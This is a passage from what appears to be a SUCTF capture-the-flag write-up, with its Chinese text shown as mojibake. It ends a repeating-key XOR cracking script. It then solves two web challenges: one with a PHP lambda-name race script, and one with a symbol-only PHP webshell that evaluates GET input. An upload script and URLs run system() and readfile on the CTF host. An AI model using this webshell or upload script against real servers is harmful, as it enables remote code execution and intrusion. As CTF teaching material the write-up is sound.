class="line">                   <span class="string">"l"</span>: <span class="number">0.04025</span>, <span class="string">"c"</span>: <span class="number">0.02782</span>, <span class="string">"u"</span>: <span class="number">0.02758</span>, <span class="string">"m"</span>: <span class="number">0.02406</span>, <span class="string">"w"</span>: <span class="number">0.02360</span>,</span><br><span class="line">                   <span class="string">"f"</span>: <span class="number">0.02228</span>, <span class="string">"g"</span>: <span class="number">0.02015</span>, <span class="string">"y"</span>: <span class="number">0.01974</span>, <span class="string">"p"</span>: <span class="number">0.01929</span>, <span class="string">"b"</span>: <span class="number">0.01492</span>,</span><br><span class="line">                   <span class="string">"v"</span>: <span class="number">0.00978</span>, <span class="string">"k"</span>: <span class="number">0.00772</span>, <span class="string">"j"</span>: <span class="number">0.00153</span>, <span class="string">"x"</span>: <span class="number">0.00150</span>, <span class="string">"q"</span>: <span class="number">0.00095</span>,</span><br><span class="line">                   <span class="string">"z"</span>: <span class="number">0.00074</span>&#125;</span><br><span class="line">    relative = <span class="number">0.0</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    fpool = <span class="string">'etaoinshrdlcumwfgypbvkjxqz'</span></span><br><span class="line">    total = sum(cpool.values())  <span class="comment"># ÊÄªÂíåÂ∫îÂåÖÊã¨Â≠óÊØçÂíåÂÖ∂‰ªñÂèØËßÅÂ≠óÁ¨¶</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cpool.keys():</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> fpool:</span><br><span class="line">            relative += frequencies[i] * cpool[i] / total</span><br><span class="line">    <span class="keyword">return</span> relative</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analyseFrequency</span><span class="params">(cfreq)</span>:</span></span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> posFreq <span class="keyword">in</span> cfreq:</span><br><span class="line">        mostRelative = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> keyChr <span class="keyword">in</span> posFreq.keys():</span><br><span class="line">            r = calCorrelation(posFreq[keyChr])</span><br><span class="line">            <span class="keyword">if</span> r &gt; mostRelative:</span><br><span class="line">                mostRelative = r</span><br><span class="line">                keychar = keyChr</span><br><span class="line">        key.append(keychar)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFrequency</span><span class="params">(cipher, keyPoolList)</span>:</span></span><br><span class="line">    <span class="string">''' ‰º†ÂÖ•ÁöÑÂØÜÊñá‰Ωú‰∏∫Êï∞Â≠óÂàóË°®Â§ÑÁêÜ</span></span><br><span class="line"><span class="string">        ‰º†ÂÖ•ÂØÜÈí•ÁöÑÂ≠óÁ¨¶ÈõÜÂ∫î‰∏∫ÂàóË°®Ôºå‰æùÊ¨°ÂåÖÂê´ÂêÑÂ≠óËäÇÂ≠óÁ¨¶ÈõÜ„ÄÇ</span></span><br><span class="line"><span class="string">            ÂΩ¢Â¶Ç[[0x11,0x12],[0x22]]</span></span><br><span class="line"><span class="string">        ËøîÂõûÂ≠óÈ¢ëÂàóË°®Ôºå‰æùÊ¨°‰∏∫ÂêÑÂ≠óËäÇÂ≠óÁ¨¶ÈõÜ‰∏≠ÊØè‰∏ÄÂ≠óÁ¨¶‰Ωú‰∏∫ÂØÜÈí•ÁªÑÊàêÈÉ®ÂàÜÊó∂ÂØπÂ∫îÁöÑÊòéÊñáÂ≠óÈ¢ë</span></span><br><span class="line"><span class="string">            ÂΩ¢Â¶Ç[&#123;</span></span><br><span class="line"><span class="string">                    0x11:&#123;'a':2,'b':3&#125;,</span></span><br><span class="line"><span class="string">                    0x12:&#123;'e':6&#125;</span></span><br><span class="line"><span class="string">                 &#125;,</span></span><br><span class="line"><span class="string">                 &#123;</span></span><br><span class="line"><span class="string">                    0x22:&#123;'g':1&#125;</span></span><br><span class="line"><span class="string">                 &#125;]</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    freqList = []</span><br><span class="line">    keyLen = len(keyPoolList)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(keyLen):</span><br><span class="line">        posFreq = dict()</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> keyPoolList[i]:</span><br><span class="line">            posFreq[k] = dict()</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> cipher[i::keyLen]:</span><br><span class="line">                p = chr(k ^ c)</span><br><span class="line">                posFreq[k][p] = posFreq[k][p] + <span class="number">1</span> <span class="keyword">if</span> p <span class="keyword">in</span> posFreq[k] <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">        freqList.append(posFreq)</span><br><span class="line">    <span class="keyword">return</span> freqList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vigenereDecrypt</span><span class="params">(cipher, key)</span>:</span></span><br><span class="line">    plain = <span class="string">''</span></span><br><span class="line">    cur = <span class="number">0</span></span><br><span class="line">    ll = len(key)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cipher:</span><br><span class="line">        plain += chr(c ^ key[cur])</span><br><span class="line">        cur = (cur + <span class="number">1</span>) % ll</span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    ps = []</span><br><span class="line">    ks = []</span><br><span class="line">    ss = []</span><br><span class="line">    ps.extend(xrange(<span class="number">0xff</span>))</span><br><span class="line">    ks.extend(xrange(<span class="number">0x20</span>,<span class="number">0x80</span>))</span><br><span class="line">    ss.extend(xrange(<span class="number">1</span>, <span class="number">50</span>))</span><br><span class="line">    cipher = getCipher()</span><br><span class="line"></span><br><span class="line">    keyPool = getKeyPool(cipher=cipher, stepSet=ss, plainSet=ps, keySet=ks)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> keyPool:</span><br><span class="line">        freq = getFrequency(cipher, keyPool[i])</span><br><span class="line">        key = analyseFrequency(freq)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">''</span>.join(map(chr,key))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous"></a>Anonymous</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$MY = create_function(<span class="string">""</span>,<span class="string">"die(`cat flag.php`);"</span>);</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function SUCTF_$hash()&#123;"</span></span><br><span class="line">    .<span class="string">"global \$MY;"</span></span><br><span class="line">    .<span class="string">"\$MY();"</span></span><br><span class="line">    .<span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func_name'</span>]))&#123;</span><br><span class="line">    $_GET[<span class="string">"func_name"</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/19e3ee990cb7" target="_blank" rel="noopener">https://www.jianshu.com/p/19e3ee990cb7</a> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">from multiprocessing.dummy import Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def run(i):</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        HOST = <span class="string">'web.suctf.asuri.org'</span></span><br><span class="line">        PORT = <span class="number">81</span></span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(<span class="string">'GET /index.php HTTP/1.1\nHost: web.suctf.asuri.org\nConnection: Keep-Alive\n\n'</span>)</span><br><span class="line">        <span class="comment"># s.close()</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'ok'</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">print</span> requests.get(<span class="string">'http://web.suctf.asuri.org:81/index.php?func_name=%00lambda_1'</span>).content</span><br><span class="line"></span><br><span class="line">i = <span class="number">8</span></span><br><span class="line">pool = ThreadPool( i )</span><br><span class="line">result = pool.map_async( run, range(i) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><p><code>$flag=&quot;SUCTF{L4GsMqu6gu5knFnCi2Te8SjSucxKfQj6tuPJokoFhTCJjpa6RSfK}&quot;;</code> </p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>Ë¶ÅÊ±Ç‰∏ä‰º†ÁöÑwebshellÊñá‰ª∂‰ªéÁ¨¨6‰∏™Â≠óÁ¨¶ÂºÄÂßãÈÉΩ‰∏çËÉΩÂú®ÈªëÂêçÂçïÂÜÖ„ÄÇ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($contents=file_get_contents($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]))&#123;</span><br><span class="line">    $data=substr($contents,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($black_char <span class="keyword">as</span> $b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($data, $b) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"illegal char"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Áî®burp intruderË∑ë‰∏ÄÈÅçÔºåÂèëÁé∞‰∏çÂú®ÈªëÂêçÂçïÈáåÁöÑÂèØÊâìÂç∞Â≠óÁ¨¶Êúâ <code>$()[]_~=;.</code>  ÂÖ±10‰∏™„ÄÇ</p><p>Ë∑ëÁöÑÊó∂ÂÄôÈúÄÊ≥®ÊÑè<code>Intruder=&gt;payloads=&gt;payload encoding</code> Â§ÑÈúÄÂèñÊ∂àÂãæÈÄâÔºåÂê¶Âàô‰ºöÂõ†‰∏∫Â≠óÁ¨¶ÁºñÁ†ÅËÄå‰∏çËÉΩÂæóÂà∞Ê≠£Á°ÆÁöÑÁôΩÂêçÂçï„ÄÇ</p><p>Ë∑ëÁöÑÊó∂ÂÄôÂèØ‰ª•Âú®<code>Intruder=&gt;options=&gt;Grep-Match</code> ‰∏≠ÈÄâÊã© flag <code>illegal</code> ÔºåËøôÊ†∑Â∞±ÂèØ‰ª•Âø´ÈÄüÁúãÂà∞ÈÇ£‰∫õÂ≠óÁ¨¶ÊòØÂêàÊ≥ïÁöÑ‰∫Ü„ÄÇ</p><p>Êé•‰∏ãÊù•Â∞±ÊòØÊûÑÈÄ†‰∏Ä‰∏™Áî± <code>$()[]_~=;.</code> ÁªÑÊàêÁöÑwebshell‰∫ÜÔºå‰∏ªË¶ÅÊÄùË∑ØÊù•Ëá™ <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">‰∏Ä‰∫õ‰∏çÂåÖÂê´Êï∞Â≠óÂíåÂ≠óÊØçÁöÑwebshell</a> „ÄÇ</p><p>ÊûÑÈÄ†Âá∫ÁöÑÊúÄÁªàÁªìÊûúÂ¶Ç‰∏ãÔºö</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>= $_=_==_;$__=~‰∏Ä[$_];$___=~‰∫Ü[$_];$____=~Á´Ø[$_];$_____=~Âæó[$_];$______=~Á¨¨[$_];$_______=~Â≠¶[$_];$_=_.$__.$___.$____;$_=$$_;$__=$_____.$______.$______.$___.$_______.$____;$__($_[_]);</span><br></pre></td></tr></table></figure><p>ËØ¶ÁªÜÊ≥®ÈáäÔºö</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>= </span><br><span class="line">$_=_==_;<span class="comment">//1</span></span><br><span class="line">$__=~‰∏Ä[$_];<span class="comment">//G</span></span><br><span class="line">$___=~‰∫Ü[$_];<span class="comment">//E</span></span><br><span class="line">$____=~Á´Ø[$_];<span class="comment">//T</span></span><br><span class="line">$_____=~Âæó[$_];<span class="comment">//A</span></span><br><span class="line">$______=~Á¨¨[$_];<span class="comment">//S</span></span><br><span class="line">$_______=~Â≠¶[$_];<span class="comment">//R</span></span><br><span class="line">$_=_.$__.$___.$____;<span class="comment">//_GET</span></span><br><span class="line">$_=$$_;<span class="comment">//$_GET</span></span><br><span class="line">$__=$_____.$______.$______.$___.$_______.$____;<span class="comment">//ASSERT</span></span><br><span class="line">$__($_[_]);<span class="comment">//ASSERT($_GET[_]);</span></span><br><span class="line"></span><br><span class="line">------------------------------------------------------</span><br><span class="line">http:<span class="comment">//web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php</span></span><br><span class="line">?_=phpinfo();</span><br></pre></td></tr></table></figure><p>ÂèØ‰ª•Êúâ‰∏Ä‰∏™Êõ¥Áü≠Êõ¥ËàíÊúçÁöÑÈÄâÊã©</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>= $_=_==_;$__=~‰∏Ä[$_];$___=~‰∫Ü[$_];$____=~Á´Ø[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]);</span><br></pre></td></tr></table></figure><p>ËØ¶ÁªÜÊ≥®ÈáäÔºö</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$_=_==_;<span class="comment">//1</span></span><br><span class="line">$__=~‰∏Ä[$_];<span class="comment">//G</span></span><br><span class="line">$___=~‰∫Ü[$_];<span class="comment">//E</span></span><br><span class="line">$____=~Á´Ø[$_];<span class="comment">//T</span></span><br><span class="line">$_=_.$__.$___.$____;<span class="comment">//_GET</span></span><br><span class="line">$_=$$_;<span class="comment">//$_GET</span></span><br><span class="line">$_[_]($_[__]);<span class="comment">//$_GET[_]($_GET[__]);</span></span><br><span class="line">------------------------------------------------------</span><br><span class="line">http:<span class="comment">//web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php</span></span><br><span class="line">?_=assert&amp;__=phpinfo();</span><br></pre></td></tr></table></figure><p>ËØªÂèñflag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php?_=assert&amp;__=system(%22ls%20-l%20/%22);</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php?_=assert&amp;__=readfile(%27/Th1s_14_f14g%27);</span></span><br><span class="line"></span><br><span class="line">SUCTF&#123;KyGeBLWoF9MXcdDKBdbw2B54sMxbsxyXBpm8t5nQUHBJKuAYEd6o&#125;</span><br></pre></td></tr></table></figure><p>‰∏ä‰º†Â∞èËÑöÊú¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">data=<span class="string">"&lt;?= $_=_==_;$__=~‰∏Ä[$_];$___=~‰∫Ü[$_];$____=~Á´Ø[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]);"</span></span><br><span class="line">base=<span class="string">"http://web.suctf.asuri.org:82/"</span></span><br><span class="line">files = &#123;<span class="string">'file'</span>: (<span class="string">'findneo.php'</span>, data, <span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">content = requests.post(base+<span class="string">"upload.php"</span>, files=files).text</span><br><span class="line">cmd=<span class="string">'system("dir /");'</span></span><br><span class="line">payload=base+re.match(<span class="string">"[\s\S]*Stored in: ([a-z.0-9/]+)[\s\S]*"</span>,content).group(<span class="number">1</span>)+<span class="string">"?_=assert&amp;__="</span>+cmd</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"><span class="keyword">print</span> requests.get(payload).content</span><br><span class="line"></span><br><span class="line"><span class="comment"># http://web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php?_=assert&amp;__=system("dir /");</span></span><br><span class="line"><span class="comment"># 1Th1s_14_f14g  boot  etc   lib mediaopt   root  sbin  sys  usr</span></span><br><span class="line"><span class="comment"># bin      dev   home  lib64  mntproc  run   srv   tmp  var</span></span><br></pre></td></tr></table></figure><p>ÂÜô‰∫Ü‰∏Ä‰∏™Áî®‰∏äËø∞ÊñπÊ≥ïÁîüÊàê‰ªªÊÑèÂ≠óÊØçÊûÑÊàêÁöÑÂ≠óÁ¨¶‰∏≤ÁöÑÂ∞èÁ®ãÂ∫èÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: UTF-8</span></span><br><span class="line"><span class="comment"># Author: 'findneo'</span></span><br><span class="line"><span class="comment"># compose php code from limited whitelist: $()[]_~=;.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gendict</span><span class="params">(index=<span class="string">'_==_'</span>,target_chars=[chr<span class="params">(i)</span> for i in range<span class="params">(<span class="number">0x20</span>,<span class="number">0x7f</span>)</span>])</span>:</span></span><br><span class="line">    sentence=<span class="string">"Â¶ÇÊòØÊàëÈóª„ÄÇ‰∏ÄÊó∂ËñÑ‰ºΩÊ¢µ„ÄÇ‰ΩèÁéãËàçÂüéÈπ´Â≥∞Â±±È°∂„ÄÇ‰∏éÂ§ßËãæÂàç‰ºóÂçÉ‰∫åÁôæ‰∫îÂçÅ‰∫∫‰ø±„ÄÇÁöÜÈòøÁΩóÊ±â„ÄÇËØ∏ÊºèÂ∑≤Â∞ΩÊó†Â§çÁÉ¶ÊÅºÂæóÁúüËá™Âú®ÂøÉÂñÑËß£ËÑ±ÊÖßÂñÑËß£ËÑ±„ÄÇÂ¶ÇË∞ÉÊÖßÈ©¨‰∫¶Â¶ÇÂ§ßÈæô„ÄÇÂ∑≤‰ΩúÊâÄ‰ΩúÂ∑≤ÂäûÊâÄÂäû„ÄÇÂºÉËØ∏ÈáçÊãÖÈÄÆÂæóÂ∑±Âà©„ÄÇÂ∞ΩËØ∏ÊúâÁªìÊ≠£Áü•Ëß£ËÑ±„ÄÇËá≥ÂøÉËá™Âú®Á¨¨‰∏ÄÁ©∂Á´ü„ÄÇÈô§ÈòøÈöæÈôÄÁã¨Â±ÖÂ≠¶Âú∞ÂæóÈ¢ÑÊµÅÊûú„ÄÇÂ§ßËø¶Âè∂Ê≥¢ËÄå‰∏∫‰∏äÈ¶ñ„ÄÇÂ§çÊúâ‰∫îÁôæËãæÂàçÂ∞º‰ºó„ÄÇÁöÜÈòøÁΩóÊ±â„ÄÇÂ§ßËÉúÁîü‰∏ªËÄå‰∏∫‰∏äÈ¶ñ„ÄÇÂ§çÊúâÊó†ÈáèÈÇ¨Ê≥¢Á¥¢Ëø¶„ÄÅÈÇ¨Ê≥¢ÊñØËø¶„ÄÇÁöÜËßÅÂú£Ë∞õ„ÄÇÂ§çÊúâÊó†ÈáèÊó†Êï∞Ëè©Ëê®Êë©ËØÉËê®‰ºó„ÄÇ‰∏ÄÂàáÁöÜÂæóÈôÄÁΩóÂ∞ºÈó®‰∏âÊë©Âú∞Èó®„ÄÇ‰ΩèÁ©∫Êó†Áõ∏Êó†ÂàÜÂà´ÊÑø„ÄÇÂ∑≤ÂæóËØ∏Ê≥ïÂπ≥Á≠âÊÄßÂøç„ÄÇÂÖ∑Ë∂≥ÊàêÂ∞±ÂõõÊó†Á¢çËß£„ÄÇÂá°ÊâÄÊºîËØ¥Ëæ©ÊâçÊó†Â∞Ω„ÄÇ‰∫é‰∫îÁ•ûÈÄöËá™Âú®Ê∏∏Êàè„ÄÇÊâÄËØÅÊô∫Êñ≠Ê∞∏Êó†ÈÄÄÂ§±„ÄÇË®ÄË°åÂ®ÅËÇÉÈóªÁöÜÊï¨Âèó„ÄÇÂãáÁåõÁ≤æËøõÁ¶ªËØ∏ÊáàÊÄ†„ÄÇËÉΩËàç‰∫≤Ë¥¢‰∏çÈ°æË∫´ÂëΩ„ÄÇÁ¶ªÁü´Á¶ªËØ≥Êó†ÊüìÊó†Ê±Ç„ÄÇÁ≠â‰∏∫ÊúâÊÉÖËÄåÂÆ£Ê≠£Ê≥ï„ÄÇÂ•ëÊ∑±Ê≥ïÂøçÁ©∑ÊúÄÊûÅË∂£„ÄÇÂæóÊó†ÊâÄÁïèÂÖ∂ÂøÉÊ≥∞ÁÑ∂„ÄÇË∂Ö‰ºóÈ≠îÂ¢ÉÂá∫ËØ∏‰∏öÈöú„ÄÇÊëßÁÅ≠‰∏ÄÂàáÁÉ¶ÊÅºÊÄ®Êïå„ÄÇÂª∫Ê≠£Ê≥ïÂπ¢‰ºèËØ∏ÈÇ™ËÆ∫„ÄÇÂ£∞ÈóªÁã¨Ëßâ‰∏çËÉΩÊµãÈáè„ÄÇÂæóÂøÉËá™Âú®ÂæóÊ≥ïËá™Âú®„ÄÇ‰∏öÊÉëËßÅÈöúÁöÜÂ∑≤Ëß£ËÑ±„ÄÇÊã©Ê≥ïËæ©ËØ¥Êó†‰∏çÂñÑÂ∑ß„ÄÇÂÖ•Ê∑±ÁºòËµ∑ÁîüÁÅ≠Ê≥ïÈó®„ÄÇÁ¶ªËßÅÈöèÁú†ËàçËØ∏Áº†Áªì„ÄÇÊô∫ÊÖßÈÄöËææËØ∏Âú£Ë∞õÁêÜ„ÄÇÊõæÊó†Êï∞Âä´ÂèëÂºòË™ìÊÑø„ÄÇÂÆπË≤åÁÜôÊÄ°ÂÖàË®ÄÊé•Âºï„ÄÇËøúÁ¶ªÈ¢¶ËπôËæûÈüµÊ∏ÖÂíå„ÄÇËµûÈ¢ÇÂñÑÂ∑ßËæ©ÊâçÊó†Êªû„ÄÇÂ§ÑÊó†Ëæπ‰ºóÂ®ÅÂæ∑ËÇÉÁÑ∂„ÄÇÊäëÊâ¨Ëá™Âú®ÈÉΩÊó†ÊâÄÁïè„ÄÇÂ§ö‰ø±ËÉùÂä´Â∑ßËØ¥Êó†Â∞Ω„ÄÇ‰∫éËØ∏Ê≥ïÈó®ËÉúËß£ËßÇÂØü„ÄÇÂ¶ÇÂπªÂ¶ÇÈò≥ÁÑ∞„ÄÇÂ¶ÇÊ¢¶Â¶ÇÊ∞¥Êúà„ÄÇÂ¶ÇÂìçÂ¶ÇÁ©∫Ëä±„ÄÇÂ¶ÇÂÉèÂ¶ÇÂÖâÂΩ±„ÄÇÂ¶ÇÂèòÂåñ‰∫ã„ÄÇÂ¶ÇÂØªÈ¶ôÂüé„ÄÇËôΩÁöÜÊó†ÂÆûËÄåÁé∞‰ººÊúâ„ÄÇÁ¶ª‰∏ãÂä£ÂøÉËØ¥Ê≥ïÊó†Áïè„ÄÇËÉΩÈöèËØÅÂÖ•Êó†ÈáèÊ≥ïÈó®„ÄÇÂñÑÁü•ÊúâÊÉÖÂøÉË°åÊâÄË∂£„ÄÇ‰ª•ÂæÆÂ¶ôÊÖßËÄåÂ∫¶ËÑ±‰πã„ÄÇ‰∫éËØ∏ÊúâÊÉÖÂøÉÊó†ÊåÇÁ¢ç„ÄÇÊàêÂ∞±ÊúÄ‰∏äÊó†ÁîüÊ≥ïÂøç„ÄÇÂñÑÂÖ•ËØ∏Ê≥ïÂπ≥Á≠âÊÄßÊô∫„ÄÇÁîöÊ∑±Ê≥ïÊÄßËÉΩÂ¶ÇÂÆûÁü•„ÄÇÈöèÂÖ∂ÊâÄÂ∫îÂ∑ß‰ª§ÊÇüÂÖ•„ÄÇËÉΩÂñÑÂÆ£ËØ¥ÁºòËµ∑Ê≥ïÈó®„ÄÇÊëÑÂèóÊó†Ëæπ‰ΩõÂõΩÂ§ßÊÑø„ÄÇ‰∫éÂçÅÊñπÁïåÊó†Êï∞ËØ∏‰Ωõ„ÄÇÁ≠âÊåÅÊ≠£ÂøµÂ∏∏Áé∞Âú®Ââç„ÄÇËØ∏‰ΩõÂá∫‰∏ñÁöÜËÉΩÂéÜ‰∫ã„ÄÇ‰∫¶ËÉΩÂäùËØ∑ËΩ¨Ê≠£Ê≥ïËΩÆ„ÄÇ‰∏çËà¨Ê∂ÖÊßÉÂ∫¶Êó†Èáè‰ºóÂñÑËÉΩ‰ºèÁÅ≠‰∏ÄÂàáÊúâÊÉÖÁßçÁßçËßÅÁº†ËØ∏ÁÉ¶ÊÅºÁÑ∞„ÄÇÈ°ªËáæÊ∏∏ÊàèÁôæÂçÉÁ≠âÊåÅ„ÄÇÂºïÂèëÊó†ËæπÊÆäËÉúÂäüÂæ∑„ÄÇÊ≠§ËØ∏Ëè©Ëê®ÂÖ∑Â¶ÇÊòØÁ≠âÂ¶ôÂäüÂæ∑Êµ∑„ÄÇËÆæÁªèÊó†Èáè‰ø±ËÉùÂ§ßÂä´„ÄÇÂèπ‰∏çËÉΩÂ∞Ω„ÄÇÂÖ∂ÂêçÊõ∞Ë¥§ÂÆàËè©Ëê®Êë©ËØÉËê®„ÄÇÂÆùÊÄßËè©Ëê®Êë©ËØÉËê®„ÄÇÂÆùËóèËè©Ëê®Êë©ËØÉËê®„ÄÇÂÆùÊéàËè©Ëê®Êë©ËØÉËê®„ÄÇÂØºÂ∏àËè©Ëê®Êë©ËØÉËê®„ÄÇ‰ªÅÊéàËè©Ëê®Êë©ËØÉËê®„ÄÇÊòüÊéàËè©Ëê®Êë©ËØÉËê®„ÄÇÁ•ûÊéàËè©Ëê®Êë©ËØÉËê®„ÄÇÂ∏ùÊéàËè©Ëê®Êë©ËØÉËê®„ÄÇÂπøÊÖßËè©Ëê®Êë©ËØÉËê®„ÄÇËÉúÊÖßËè©Ëê®Êë©ËØÉËê®„ÄÇ‰∏äÊÖßËè©Ëê®Êë©ËØÉËê®„ÄÇÂ¢ûÈïøÊÖßËè©Ëê®Êë©ËØÉËê®„ÄÇÊó†ËæπÊÖßËè©Ëê®Êë©ËØÉËê®„ÄÇ‰∏çËôöËßÅËè©Ëê®Êë©ËØÉËê®„ÄÇÊó†ÈöúÊÖßËè©Ëê®Êë©ËØÉËê®„ÄÇÂñÑÂèëË∂